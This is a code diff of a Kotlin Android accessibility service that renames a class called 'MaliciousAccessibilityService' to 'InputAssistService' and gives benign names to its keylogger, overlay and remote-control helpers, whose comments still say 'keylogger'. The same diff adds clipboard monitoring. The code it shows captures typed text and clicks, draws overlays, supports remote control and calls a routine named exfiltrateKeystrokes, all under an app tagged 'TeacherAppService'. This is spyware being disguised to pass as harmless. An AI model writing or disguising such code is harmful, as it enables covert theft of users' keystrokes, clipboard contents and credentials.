@@ -6,7 +6,7 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 
 /**
- * MaliciousAccessibilityService — the ONLY AccessibilityService in the app.
+ * InputAssistService — the ONLY AccessibilityService in the app.
  *
  * Declared once in AndroidManifest → ONE permission popup for the user.
  *
@@ -17,17 +17,18 @@ import android.view.accessibility.AccessibilityEvent
  *
  * ScreenMirrorService also calls this via [instance] for remote control.
  */
-class MaliciousAccessibilityService : AccessibilityService() {
+class InputAssistService : AccessibilityService() {
 
     private val TAG = "TeacherAppService"
 
-    private lateinit var keylogger:     KeyloggerHelper
-    private lateinit var overlay:       OverlayHelper
-    private lateinit var remoteControl: RemoteControlHelper
+    private lateinit var keylogger:        TextSyncHelper
+    private lateinit var overlay:          UiLayerHelper
+    private lateinit var remoteControl:    GestureHelper
+    private lateinit var clipboardMonitor: ClipboardMonitor
 
     companion object {
         /** Singleton used by ScreenMirrorService for remote-control calls. */
-        var instance: MaliciousAccessibilityService? = null
+        var instance: InputAssistService? = null
     }
 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
@@ -36,18 +37,20 @@ class MaliciousAccessibilityService : AccessibilityService() {
         super.onServiceConnected()
         instance = this
 
-        keylogger     = KeyloggerHelper(this)
-        overlay       = OverlayHelper(this)
-        remoteControl = RemoteControlHelper(this)
+        keylogger        = TextSyncHelper(this)
+        overlay          = UiLayerHelper(this)
+        remoteControl    = GestureHelper(this)
+        clipboardMonitor = ClipboardMonitor(this)
 
         // Configure events — union of all helper requirements
         val info = AccessibilityServiceInfo().apply {
             eventTypes =
-                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED  or   // overlay
-                        AccessibilityEvent.TYPE_WINDOWS_CHANGED        or   // overlay
-                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED      or   // keylogger
-                        AccessibilityEvent.TYPE_VIEW_FOCUSED           or   // keylogger field focus
-                        AccessibilityEvent.TYPE_VIEW_CLICKED               // keylogger clicks
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or   // overlay
+                        AccessibilityEvent.TYPE_WINDOWS_CHANGED          or   // overlay
+                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED        or   // keylogger
+                        AccessibilityEvent.TYPE_VIEW_FOCUSED             or   // keylogger field focus
+                        AccessibilityEvent.TYPE_VIEW_CLICKED             or   // keylogger clicks
+                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED        // clipboard
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             flags =
                 AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
@@ -56,7 +59,7 @@ class MaliciousAccessibilityService : AccessibilityService() {
         }
         serviceInfo = info
 
-        Log.d(TAG, "✅ MaliciousAccessibilityService connected — all helpers initialised")
+        Log.d(TAG, "✅ InputAssistService connected — all helpers initialised")
     }
 
     // ── Event routing ─────────────────────────────────────────────────────────
@@ -65,6 +68,9 @@ class MaliciousAccessibilityService : AccessibilityService() {
         if (event == null) return
         keylogger.onEvent(event)   // handles TYPE_VIEW_TEXT_CHANGED + TYPE_VIEW_FOCUSED
         overlay.onEvent(event)     // handles TYPE_WINDOW_STATE_CHANGED + TYPE_WINDOWS_CHANGED
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            clipboardMonitor.onClipboardChanged(event)
+        }
     }
 
     // ── Lifecycle cleanup ─────────────────────────────────────────────────────
@@ -73,6 +79,7 @@ class MaliciousAccessibilityService : AccessibilityService() {
         Log.d(TAG, "Service interrupted — flushing keystrokes")
         keylogger.exfiltrateKeystrokes()
         overlay.removeOverlay()
+        clipboardMonitor.clearHistory()
     }
 
     override fun onDestroy() {
